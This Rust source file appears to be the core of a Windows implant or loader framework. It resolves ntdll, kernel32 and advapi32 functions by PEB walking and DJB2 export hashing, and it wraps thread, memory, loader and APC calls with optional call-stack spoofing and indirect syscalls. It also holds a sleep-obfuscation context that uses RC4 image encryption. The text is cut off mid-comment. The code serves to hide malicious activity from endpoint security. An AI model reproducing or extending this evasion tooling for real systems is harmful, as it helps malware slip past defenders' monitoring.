//! Core API wrapper module providing typed access to dynamically resolved Windows functions.
//!
//! All function pointers are resolved at construction time ([`Api::new`]) by walking the
//! PEB and hashing export names with DJB2. Each module struct (`NtdllModule`,
//! `Kernel32Module`, etc.) stores raw `*mut Fn*` pointers alongside a `handle` (base
//! address) and `size`. Wrapper methods on each struct transmute the pointer and call
//! the underlying function, optionally routing through call-stack spoofing (`spoof-uwd`)
//! or indirect syscall dispatch (`spoof-syscall`) depending on feature flags.
//!
//! The dispatch pattern for each wrapper is:
//!
//! ```text
//! ┌─────────────────────────────────────────────────────────┐
//! │  1. transmute stored *mut FnXxx to FnXxx                │
//! │  2. #[cfg(spoof-uwd + spoof-syscall)] → spoof_syscall! │
//! │  3. #[cfg(spoof-uwd)]                 → spoof_uwd!     │
//! │  4. #[cfg(not spoof-uwd)]             → direct call    │
//! └─────────────────────────────────────────────────────────┘
//! ```

use {
    crate::{
        hash_str,
        util::{get_export_by_hash, get_loaded_module_by_hash, memzero, module_size},
        windows::*,
    },
    core::{mem::transmute, ptr::null_mut},
};

/// RC4 encryption key size in bytes (used by `AdvapiModule.enckey`).
pub const KEY_SIZE: usize = 16;

/// Top-level API container holding all resolved module wrappers and sleep context.
///
/// Created via [`Api::new`] which resolves all function pointers from the PEB.
/// The `sleep` field holds the obfuscation context (image base, length, sections,
/// sleep duration) configured by the caller before invoking a sleep technique.
pub struct Api {
    /// Ntdll function wrappers (NT syscall layer).
    pub ntdll: NtdllModule,
    /// Kernel32 function wrappers (Win32 API layer).
    pub kernel32: Kernel32Module,
    /// KernelBase function wrappers (CFG management).
    pub kernelbase: KernelBaseModule,
    /// Advapi32 function wrappers (RC4 encryption: SystemFunction032/040/041).
    pub advapi: AdvapiModule,
    /// Sleep obfuscation context (image region, timing, memory sections).
    pub sleep: SleepContext,
}

/// Resolved function pointers from `ntdll.dll`.
///
/// Contains the NT native API surface used throughout: memory management, thread
/// control, synchronization, context manipulation, thread pool, and loader functions.
/// Each `*_ptr` field stores a raw function pointer resolved by DJB2 hash at
/// [`Api::new`] time. The corresponding wrapper method transmutes and calls it.
pub struct NtdllModule {
    /// Base address of ntdll in the current process.
    pub handle: usize,
    /// `SizeOfImage` from ntdll's PE optional header.
    pub size: u32,
    #[cfg(feature = "spoof-uwd")]
    pub spoof_config: crate::spoof::uwd::types::Config,
    #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
    pub syscall_spoof_config: crate::spoof::uwd::types::Config,
    pub NtGetContextThread_ptr: *mut FnNtGetContextThread,
    pub NtSetContextThread_ptr: *mut FnNtSetContextThread,
    pub NtResumeThread_ptr: *mut FnNtResumeThread,
    pub NtWaitForSingleObject_ptr: *mut FnNtWaitForSingleObject,
    pub RtlUserThreadStart_ptr: *mut FnRtlUserThreadStart,
    pub RtlCreateUserThread_ptr: *mut FnRtlCreateUserThread,
    pub NtAllocateVirtualMemory_ptr: *mut FnNtAllocateVirtualMemory,
    pub NtFreeVirtualMemory_ptr: *mut FnNtFreeVirtualMemory,
    pub NtProtectVirtualMemory_ptr: *mut FnNtProtectVirtualMemory,
    pub RtlCreateHeap_ptr: *mut FnRtlCreateHeap,
    pub LdrGetProcedureAddress_ptr: *mut FnLdrGetProcedureAddress,
    pub LdrLoadDll_ptr: *mut FnLdrLoadDll,
    pub LdrUnloadDll_ptr: *mut FnLdrUnloadDll,
    pub NtAlertResumeThread_ptr: *mut FnNtAlertResumeThread,
    pub NtClose_ptr: *mut FnNtClose,
    pub NtContinue_ptr: *mut FnNtContinue,
    pub NtCreateEvent_ptr: *mut FnNtCreateEvent,
    pub NtCreateThreadEx_ptr: *mut FnNtCreateThreadEx,
    pub NtOpenThread_ptr: *mut FnNtOpenThread,
    pub NtQueryInformationProcess_ptr: *mut FnNtQueryInformationProcess,
    pub NtQueueApcThread_ptr: *mut FnNtQueueApcThread,
    pub NtSetEvent_ptr: *mut FnNtSetEvent,
    pub NtSignalAndWaitForSingleObject_ptr: *mut FnNtSignalAndWaitForSingleObject,
    pub NtTerminateThread_ptr: *mut FnNtTerminateThread,
    pub NtTestAlert_ptr: *mut FnNtTestAlert,
    pub NtDuplicateObject_ptr: *mut FnNtDuplicateObject,
    pub RtlAllocateHeap_ptr: *mut FnRtlAllocateHeap,
    pub RtlExitUserThread_ptr: *mut FnRtlExitUserThread,
    pub RtlFreeHeap_ptr: *mut FnRtlFreeHeap,
    pub RtlInitAnsiString_ptr: *mut FnRtlInitAnsiString,
    pub RtlInitUnicodeString_ptr: *mut FnRtlInitUnicodeString,
    pub RtlAnsiStringToUnicodeString_ptr: *mut FnRtlAnsiStringToUnicodeString,
    pub RtlFreeUnicodeString_ptr: *mut FnRtlFreeUnicodeString,
    pub RtlRandomEx_ptr: *mut FnRtlRandomEx,
    pub RtlWalkHeap_ptr: *mut FnRtlWalkHeap,
    pub RtlCreateTimerQueue_ptr: *mut FnRtlCreateTimerQueue,
    pub RtlDeleteTimerQueue_ptr: *mut FnRtlDeleteTimerQueue,
    pub RtlCreateTimer_ptr: *mut FnRtlCreateTimer,
    pub RtlCaptureContext_ptr: *mut FnRtlCaptureContext,
    pub RtlAcquireSRWLockExclusive_ptr: *mut FnRtlAcquireSRWLockExclusive,
    pub ZwWaitForWorkViaWorkerFactory_ptr: *mut FnZwWaitForWorkViaWorkerFactory,
    pub NtLockVirtualMemory_ptr: *mut FnNtLockVirtualMemory,
    pub TpAllocPool_ptr: *mut FnTpAllocPool,
    pub TpSetPoolStackInformation_ptr: *mut FnTpSetPoolStackInformation,
    pub TpSetPoolMinThreads_ptr: *mut FnTpSetPoolMinThreads,
    pub TpSetPoolMaxThreads_ptr: *mut FnTpSetPoolMaxThreads,
    pub TpAllocTimer_ptr: *mut FnTpAllocTimer,
    pub TpSetTimer_ptr: *mut FnTpSetTimer,
    pub TpAllocWait_ptr: *mut FnTpAllocWait,
    pub TpSetWait_ptr: *mut FnTpSetWait,
    pub TpReleaseCleanupGroup_ptr: *mut FnTpReleaseCleanupGroup,
    #[cfg(feature = "debug-dbgprint")]
    pub DbgPrint_ptr: *mut FnDbgPrint,
}

impl NtdllModule {
    // ── Thread Context ──────────────────────────────────────────────────

    /// Retrieve the context (registers) of a thread.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread whose context is to be retrieved.
    /// * `ThreadContext` - Pointer to a `CONTEXT` structure that receives the thread context.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtGetContextThread(
        &mut self,
        ThreadHandle: HANDLE,
        ThreadContext: PCONTEXT,
    ) -> NTSTATUS {
        let f: FnNtGetContextThread = transmute(self.NtGetContextThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ThreadContext
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ThreadContext
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, ThreadContext)
    }

    /// Set the context (registers) of a thread.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread whose context is to be set.
    /// * `ThreadContext` - Pointer to a `CONTEXT` structure containing the new thread context.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtSetContextThread(
        &mut self,
        ThreadHandle: HANDLE,
        ThreadContext: PCONTEXT,
    ) -> NTSTATUS {
        let f: FnNtSetContextThread = transmute(self.NtSetContextThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ThreadContext
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            ThreadContext
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, ThreadContext)
    }

    /// Resume a suspended thread, decrementing its suspend count.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread to resume.
    /// * `PreviousSuspendCount` - Optional pointer to a variable that receives the previous suspend count.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtResumeThread(
        &mut self,
        ThreadHandle: HANDLE,
        PreviousSuspendCount: PULONG,
    ) -> NTSTATUS {
        let f: FnNtResumeThread = transmute(self.NtResumeThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            PreviousSuspendCount
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            PreviousSuspendCount
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, PreviousSuspendCount)
    }

    // ── Synchronization ───────────────────────────────────────────────

    /// Wait for an object (event, thread, etc.) to become signaled.
    ///
    /// # Arguments
    ///
    /// * `Handle` - Handle to the object to wait on.
    /// * `Alertable` - If `TRUE`, the wait is alertable (APCs can interrupt it).
    /// * `Timeout` - Optional pointer to a timeout value (negative for relative, positive for absolute).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtWaitForSingleObject(
        &mut self,
        Handle: HANDLE,
        Alertable: BOOLEAN,
        Timeout: PLARGE_INTEGER,
    ) -> NTSTATUS {
        let f: FnNtWaitForSingleObject = transmute(self.NtWaitForSingleObject_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            Handle,
            Alertable as usize,
            Timeout
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Handle,
            Alertable as usize,
            Timeout
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(Handle, Alertable, Timeout)
    }

    // ── Virtual Memory ────────────────────────────────────────────────

    /// Allocate or reserve virtual memory in a process.
    ///
    /// # Arguments
    ///
    /// * `ProcessHandle` - Handle to the process in which to allocate memory.
    /// * `BaseAddress` - Pointer to a variable that specifies and receives the base address of the allocation.
    /// * `ZeroBits` - Number of high-order address bits that must be zero in the base address.
    /// * `RegionSize` - Pointer to a variable that specifies and receives the size of the region.
    /// * `AllocationType` - Bitmask of allocation type flags (e.g., `MEM_COMMIT`, `MEM_RESERVE`).
    /// * `Protect` - Memory protection for the region (e.g., `PAGE_READWRITE`).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtAllocateVirtualMemory(
        &mut self,
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        ZeroBits: ULONG_PTR,
        RegionSize: PSIZE_T,
        AllocationType: ULONG,
        Protect: ULONG,
    ) -> NTSTATUS {
        let f: FnNtAllocateVirtualMemory = transmute(self.NtAllocateVirtualMemory_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            ZeroBits,
            RegionSize,
            AllocationType as usize,
            Protect as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            ZeroBits,
            RegionSize,
            AllocationType as usize,
            Protect as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            ProcessHandle,
            BaseAddress,
            ZeroBits,
            RegionSize,
            AllocationType,
            Protect,
        )
    }

    /// Free or decommit virtual memory in a process.
    ///
    /// # Arguments
    ///
    /// * `ProcessHandle` - Handle to the process in which to free memory.
    /// * `BaseAddress` - Pointer to a variable containing the base address of the region to free.
    /// * `RegionSize` - Pointer to a variable that specifies the size of the region to free.
    /// * `FreeType` - Type of free operation (e.g., `MEM_RELEASE`, `MEM_DECOMMIT`).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtFreeVirtualMemory(
        &mut self,
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        RegionSize: PSIZE_T,
        FreeType: ULONG,
    ) -> NTSTATUS {
        let f: FnNtFreeVirtualMemory = transmute(self.NtFreeVirtualMemory_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            RegionSize,
            FreeType as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            RegionSize,
            FreeType as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ProcessHandle, BaseAddress, RegionSize, FreeType)
    }

    /// Change the protection on a region of virtual memory.
    ///
    /// # Arguments
    ///
    /// * `ProcessHandle` - Handle to the process whose memory protection is to be changed.
    /// * `BaseAddress` - Pointer to a variable containing the base address of the region.
    /// * `RegionSize` - Pointer to a variable that specifies the size of the region.
    /// * `NewProtect` - New memory protection constant (e.g., `PAGE_EXECUTE_READ`).
    /// * `OldProtect` - Pointer to a variable that receives the old protection value.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtProtectVirtualMemory(
        &mut self,
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        RegionSize: PSIZE_T,
        NewProtect: ULONG,
        OldProtect: PULONG,
    ) -> NTSTATUS {
        let f: FnNtProtectVirtualMemory = transmute(self.NtProtectVirtualMemory_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        {
            #[cfg(feature = "debug-dbgprint")]
            {
                let func_addr = f as *const u8;
                let ssn_val = crate::spoof::uwd::syscall::ssn(func_addr).unwrap_or(0xFFFF);
                let syscall_addr = crate::spoof::uwd::syscall::get_syscall_address(func_addr)
                    .unwrap_or(core::ptr::null());
                if !self.DbgPrint_ptr.is_null() {
                    let dbg: FnDbgPrint = transmute(self.DbgPrint_ptr);
                    dbg(
                        b"[LDR] NtProtectVirtualMemory: func=%p syscall_addr=%p SSN=0x%x\n\0"
                            .as_ptr(),
                        func_addr,
                        syscall_addr,
                        ssn_val as u64,
                    );
                }
            }
            return crate::spoof_syscall!(
                &self.syscall_spoof_config,
                f as *const core::ffi::c_void,
                ProcessHandle,
                BaseAddress,
                RegionSize,
                NewProtect as usize,
                OldProtect
            ) as NTSTATUS;
        }
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ProcessHandle,
            BaseAddress,
            RegionSize,
            NewProtect as usize,
            OldProtect
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            ProcessHandle,
            BaseAddress,
            RegionSize,
            NewProtect,
            OldProtect,
        )
    }

    // ── Heap ────────────────────────────────────────────────────────

    /// Create a private heap object.
    ///
    /// # Arguments
    ///
    /// * `Flags` - Heap creation flags (e.g., `HEAP_GROWABLE`).
    /// * `HeapBase` - Base address for the heap, or null to let the system allocate.
    /// * `ReserveSize` - Amount of virtual address space to reserve for the heap.
    /// * `CommitSize` - Initial committed size of the heap.
    /// * `Lock` - Optional pointer to a caller-supplied lock for heap serialization.
    /// * `Parameters` - Optional pointer to `RTL_HEAP_PARAMETERS` for advanced configuration.
    ///
    /// # Returns
    ///
    /// Pointer to the newly created heap, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn RtlCreateHeap(
        &mut self,
        Flags: ULONG,
        HeapBase: PVOID,
        ReserveSize: SIZE_T,
        CommitSize: SIZE_T,
        Lock: PVOID,
        Parameters: PRTL_HEAP_PARAMETERS,
    ) -> PVOID {
        let f: FnRtlCreateHeap = transmute(self.RtlCreateHeap_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Flags as usize,
            HeapBase,
            ReserveSize,
            CommitSize,
            Lock,
            Parameters
        ) as PVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(Flags, HeapBase, ReserveSize, CommitSize, Lock, Parameters)
    }

    // ── Module Loader ──────────────────────────────────────────────

    /// Resolve an export address from a loaded DLL by name or ordinal.
    ///
    /// # Arguments
    ///
    /// * `DllHandle` - Base address (handle) of the loaded DLL.
    /// * `ProcedureName` - Pointer to an `ANSI_STRING` containing the function name, or null if using ordinal.
    /// * `ProcedureNumber` - Ordinal number of the function, or 0 if using name.
    /// * `ProcedureAddress` - Pointer to a variable that receives the resolved function address.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn LdrGetProcedureAddress(
        &mut self,
        DllHandle: PVOID,
        ProcedureName: PANSI_STRING,
        ProcedureNumber: ULONG,
        ProcedureAddress: *mut PVOID,
    ) -> NTSTATUS {
        let f: FnLdrGetProcedureAddress = transmute(self.LdrGetProcedureAddress_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            DllHandle,
            ProcedureName,
            ProcedureNumber as usize,
            ProcedureAddress
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(DllHandle, ProcedureName, ProcedureNumber, ProcedureAddress)
    }

    /// Load a DLL into the process address space.
    ///
    /// # Arguments
    ///
    /// * `DllPath` - Optional search path for the DLL.
    /// * `DllCharacteristics` - Optional pointer to DLL characteristic flags.
    /// * `DllName` - Pointer to a `UNICODE_STRING` containing the DLL name.
    /// * `DllHandle` - Pointer to a variable that receives the loaded module base address.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn LdrLoadDll(
        &mut self,
        DllPath: PWSTR,
        DllCharacteristics: PULONG,
        DllName: PUNICODE_STRING,
        DllHandle: *mut PVOID,
    ) -> NTSTATUS {
        let f: FnLdrLoadDll = transmute(self.LdrLoadDll_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            DllPath,
            DllCharacteristics,
            DllName,
            DllHandle
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(DllPath, DllCharacteristics, DllName, DllHandle)
    }

    /// Unload a previously loaded DLL.
    ///
    /// # Arguments
    ///
    /// * `DllHandle` - Base address (handle) of the DLL to unload.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn LdrUnloadDll(&mut self, DllHandle: PVOID) -> NTSTATUS {
        let f: FnLdrUnloadDll = transmute(self.LdrUnloadDll_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, DllHandle)
            as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(DllHandle)
    }

    // ── Thread Management ──────────────────────────────────────────

    /// Resume a thread into an alertable state (processes queued APCs).
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Handle to the thread to resume in an alertable state.
    /// * `PreviousSuspendCount` - Optional pointer to a variable that receives the previous suspend count.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtAlertResumeThread(
        &mut self,
        ThreadHandle: HANDLE,
        PreviousSuspendCount: PULONG,
    ) -> NTSTATUS {
        let f: FnNtAlertResumeThread = transmute(self.NtAlertResumeThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            PreviousSuspendCount
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            PreviousSuspendCount
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, PreviousSuspendCount)
    }

    // ── Handle Management ──────────────────────────────────────────

    /// Close an NT object handle.
    ///
    /// # Arguments
    ///
    /// * `Handle` - Handle to the object to close.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtClose(&mut self, Handle: HANDLE) -> NTSTATUS {
        let f: FnNtClose = transmute(self.NtClose_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            Handle
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, Handle)
            as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(Handle)
    }

    // ── Execution Control ────────────────────────────────────────────

    /// Restore thread context from a `CONTEXT` structure and resume execution.
    ///
    /// # Arguments
    ///
    /// * `ContextRecord` - Pointer to the `CONTEXT` structure to restore.
    /// * `TestAlert` - If `TRUE`, check for pending APCs before resuming execution.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtContinue(&mut self, ContextRecord: PCONTEXT, TestAlert: BOOLEAN) -> NTSTATUS {
        let f: FnNtContinue = transmute(self.NtContinue_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ContextRecord,
            TestAlert as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ContextRecord,
            TestAlert as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ContextRecord, TestAlert)
    }

    // ── Event / Synchronization ────────────────────────────────────

    /// Create or open a named/unnamed event object.
    ///
    /// # Arguments
    ///
    /// * `EventHandle` - Pointer to a variable that receives the event handle.
    /// * `DesiredAccess` - Access mask specifying the requested access rights.
    /// * `ObjectAttributes` - Optional pointer to object attributes (name, security, etc.).
    /// * `EventType` - Type of event (`NotificationEvent` or `SynchronizationEvent`).
    /// * `InitialState` - If `TRUE`, the event is created in the signaled state.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtCreateEvent(
        &mut self,
        EventHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        EventType: EVENT_TYPE,
        InitialState: BOOLEAN,
    ) -> NTSTATUS {
        let f: FnNtCreateEvent = transmute(self.NtCreateEvent_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            EventHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            EventType as usize,
            InitialState as usize
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            EventHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            EventType as usize,
            InitialState as usize
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            EventHandle,
            DesiredAccess,
            ObjectAttributes,
            EventType,
            InitialState,
        )
    }

    /// Create a new thread in a process.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Pointer to a variable that receives the new thread handle.
    /// * `DesiredAccess` - Access mask for the thread handle.
    /// * `ObjectAttributes` - Optional pointer to object attributes for the thread.
    /// * `ProcessHandle` - Handle to the process in which the thread is created.
    /// * `StartRoutine` - Pointer to the application-defined function to execute.
    /// * `Argument` - Pointer to a variable to pass to the thread start routine.
    /// * `CreateFlags` - Thread creation flags (e.g., `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`).
    /// * `ZeroBits` - Number of high-order address bits that must be zero in the stack base.
    /// * `StackSize` - Initial size of the stack, in bytes.
    /// * `MaximumStackSize` - Maximum size of the stack, in bytes.
    /// * `AttributeList` - Optional pointer to a process/thread attribute list.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtCreateThreadEx(
        &mut self,
        ThreadHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        ProcessHandle: HANDLE,
        StartRoutine: PVOID,
        Argument: PVOID,
        CreateFlags: ULONG,
        ZeroBits: SIZE_T,
        StackSize: SIZE_T,
        MaximumStackSize: SIZE_T,
        AttributeList: PPS_ATTRIBUTE_LIST,
    ) -> NTSTATUS {
        let f: FnNtCreateThreadEx = transmute(self.NtCreateThreadEx_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            ProcessHandle,
            StartRoutine,
            Argument,
            CreateFlags as usize,
            ZeroBits,
            StackSize,
            MaximumStackSize,
            AttributeList
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            ProcessHandle,
            StartRoutine,
            Argument,
            CreateFlags as usize,
            ZeroBits,
            StackSize,
            MaximumStackSize,
            AttributeList
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            ThreadHandle,
            DesiredAccess,
            ObjectAttributes,
            ProcessHandle,
            StartRoutine,
            Argument,
            CreateFlags,
            ZeroBits,
            StackSize,
            MaximumStackSize,
            AttributeList,
        )
    }

    /// Open a handle to an existing thread.
    ///
    /// # Arguments
    ///
    /// * `ThreadHandle` - Pointer to a variable that receives the thread handle.
    /// * `DesiredAccess` - Access mask specifying the requested access rights.
    /// * `ObjectAttributes` - Pointer to the object attributes structure.
    /// * `ClientId` - Pointer to a `CLIENT_ID` identifying the thread to open.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn NtOpenThread(
        &mut self,
        ThreadHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        ClientId: PCLIENT_ID,
    ) -> NTSTATUS {
        let f: FnNtOpenThread = transmute(self.NtOpenThread_ptr);
        #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
        return crate::spoof_syscall!(
            &self.syscall_spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            ClientId
        ) as NTSTATUS;
        #[cfg(all(feature = "spoof-uwd", not(feature = "spoof-syscall")))]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            ThreadHandle,
            DesiredAccess as usize,
            ObjectAttributes,
            ClientId
        ) as NTSTATUS;
        #[cfg(not(feature = "spoof-uwd"))]
        f(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId)
    }

    /// Retrieve information about a process.
    ///
    /// # Arguments
    ///
    /// * `ProcessHandle` - Handle to the process to query.
    /// * `ProcessInformationClass` - Type of process information to retrieve.
